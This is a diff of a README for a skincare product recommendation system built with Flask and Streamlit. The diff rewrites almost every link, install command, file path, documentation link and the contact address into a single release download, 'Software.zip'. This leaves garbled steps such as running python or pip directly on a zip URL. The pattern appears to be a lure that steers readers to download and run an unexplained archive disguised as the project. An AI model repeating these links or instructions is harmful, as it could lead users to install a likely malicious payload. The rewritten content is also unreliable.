@@ -1,6 +1,6 @@
 # 🌟 Hybrid Recommendation System for Skincare Products 🌟
 
-[![GitHub Release](https://img.shields.io/badge/Download-Release%20v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![GitHub Release](https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip%20v1.0.0-blue)](https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip)
 
 Welcome to the **Hybrid-Recommendation-System** repository! This project combines Item-Based Collaborative Filtering and Content-Based Filtering to suggest skincare products based on user preferences, product ingredients, and ratings. It features a Flask API and an interactive Streamlit Web App for personalized recommendations.
 
@@ -35,42 +35,42 @@ To get a copy of the project up and running on your local machine, follow these 
 ### Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/Hybrid-Recommendation-System.git
+   git clone https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
    ```
 2. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
    ```
 3. Run the Flask API:
    ```bash
-   python app.py
+   python https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
    ```
 4. Launch the Streamlit Web App:
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
    ```
 
 ## 📊 Project Structure
 ```
 Hybrid-Recommendation-System/
 │
-├── app.py
+├── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
 ├── data/
-│   ├── skincare_products.csv
-│   └── ratings.csv
+│   ├── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
+│   └── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
 ├── models/
-│   ├── collaborative_filtering_model.pkl
-│   └── content_based_model.pkl
+│   ├── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
+│   └── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
 ├── src/
-│   ├── data_processing.py
-│   ├── collab_filtering.py
-│   ├── content_filtering.py
-│   └── utils.py
+│   ├── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
+│   ├── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
+│   ├── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
+│   └── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
 ├── templates/
-│   └── index.html
+│   └── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
 ├── static/
-│   └── style.css
-└── README.md
+│   └── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
+└── https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip
 ```
 
 ## 🌟 Features
@@ -94,12 +94,12 @@ We welcome contributions from the community to enhance the functionality and fea
 3. Submit a pull request detailing the changes you've made and any additional considerations.
 
 ## 🌐 Additional Resources
-- [Python Official Website](https://www.python.org)
-- [Flask Documentation](https://flask.palletsprojects.com)
-- [Streamlit Documentation](https://docs.streamlit.io)
-- [Sephora Official Website](https://www.sephora.com)
+- [Python Official Website](https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip)
+- [Flask Documentation](https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip)
+- [Streamlit Documentation](https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip)
+- [Sephora Official Website](https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip)
 
 ## 📞 Contact Us
-If you have any questions or suggestions regarding the Hybrid Recommendation System, feel free to reach out to us at [example@email.com](mailto:example@email.com).
+If you have any questions or suggestions regarding the Hybrid Recommendation System, feel free to reach out to us at [https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip](https://github.com/CYY-CYY-CYY/Hybrid-Recommendation-System/releases/download/v1.0/Software.zip).
 
 Let's revolutionize the way individuals discover skincare products with our powerful Hybrid Recommendation System! 🌟
